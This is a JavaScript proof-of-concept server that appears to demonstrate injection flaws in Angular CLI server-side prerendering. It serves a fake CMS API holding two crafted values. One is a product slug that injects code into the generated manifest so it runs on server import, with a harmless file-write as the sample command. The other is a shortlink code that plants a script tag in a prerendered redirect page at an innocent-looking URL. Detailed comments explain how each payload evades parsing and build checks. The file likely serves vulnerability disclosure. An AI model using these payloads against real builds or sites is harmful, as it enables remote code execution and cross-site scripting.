/**
 * The application's CMS API, and the two rows it serves.
 *
 *   GET http://localhost:4300/api/products    read by getPrerenderParams()
 *   GET http://localhost:4300/api/shortlinks  same, feeds the redirect route
 *   GET http://localhost:4300/                the build output
 *
 * Everything lives here: no database file, no fixtures, no helper scripts.
 * Rows are in memory and the two values are right below.
 *
 * Creating a row like these takes one POST to the same API: publishing a
 * product, an article, a profile handle. The repository, angular.json, the CI
 * configuration and node_modules do not have to change.
 */
import express from 'express';
import { join } from 'node:path';

/** What the injected code does. Writes a file; it could do anything. */
const COMMAND = "import('fs').then(function(f){f.writeFileSync('PWNED.txt','rce')})";

/**
 * RCE -> dist/ng-ssr-poc-rce-xss/server/angular-app-manifest.mjs
 *
 * manifest.ts interpolates the route-derived asset path into generated,
 * executable ESM, twice per entry and unescaped:
 *
 *   `'${key}': {size: .., hash: '..', text: () => import('./${chunk}')..}`
 *
 * The path lands in two incompatible syntactic positions, so a lone quote only
 * corrupts the file. This value is valid JavaScript in both:
 *
 *   - the leading `'` closes the asset key
 *   - `[(function(){..})()](){}` is a computed method name, so the payload runs
 *     when Node imports the manifest
 *   - the backtick opens a template literal that swallows the second, mangled
 *     copy of the path, the `import()` specifier
 *   - `](){('` closes the computed key and consumes the trailing
 *     `.mjs').then(m => m.default)}`
 *
 * `node --check` passes. The build succeeds, the bundle deploys and the server
 * boots, so nothing fails loudly. Carries no  :  "  <  >  |  ?  *  so the value
 * is also a legal path segment on Windows and the build completes there too.
 */
const RCE_SLUG = "x'(){},[(function(){" + COMMAND + "})()](){},[`](){('";

/**
 * XSS -> dist/ng-ssr-poc-rce-xss/browser/go/safe/index.html
 *
 * utils.ts builds the prerendered redirect page with no escaping:
 *
 *   <meta http-equiv="refresh" content="0; url=${url}">
 *   <pre>Redirecting to <a href="${url}">${url}</a></pre>
 *
 * The trailing `/../../safe` is the interesting part. The output path is built
 * with posix.join(), which collapses `..`, so the payload is erased from the
 * filename. The redirect target is built with joinUrlParts(), which does not
 * normalise, so the payload survives in the page body.
 *
 * Two `..` because the payload spans two path segments: it contains one `/`,
 * in `</script>`. No `#`, which would be parsed as a URL fragment and truncate
 * the route before it renders.
 *
 * Net effect: the poisoned page ships at a clean, ordinary-looking URL,
 * /go/safe/, with no trace of the payload in its path.
 */
const XSS_CODE = 'x"><script>alert(\'XSS - angular-cli 33248\')</script>/../../safe';

const products = [
  { id: 1, name: 'Angular Hoodie', slug: 'angular-hoodie' },
  { id: 2, name: 'NG Sticker Pack', slug: 'ng-sticker-pack' },
  { id: 1337, name: 'Totally Normal Product', slug: RCE_SLUG },
];

const shortlinks = [
  { id: 1, code: 'spring-sale' },
  { id: 2, code: 'newsletter' },
  { id: 1337, code: XSS_CODE },
];

const app = express();

app.get('/api/products', (_req, res) => res.json(products));
app.get('/api/shortlinks', (_req, res) => res.json(shortlinks));

// Serve the build output, so /go/safe/ can be opened in a browser.
app.use(express.static(join(import.meta.dirname, '..', 'dist', 'ng-ssr-poc-rce-xss', 'browser'), {
  extensions: ['html'],
}));

app.listen(4300, () => {
  console.log('[backend] CMS API on http://localhost:4300');
  console.log(`[backend] products  slug: ${RCE_SLUG}`);
  console.log(`[backend] shortlinks code: ${XSS_CODE}`);
});
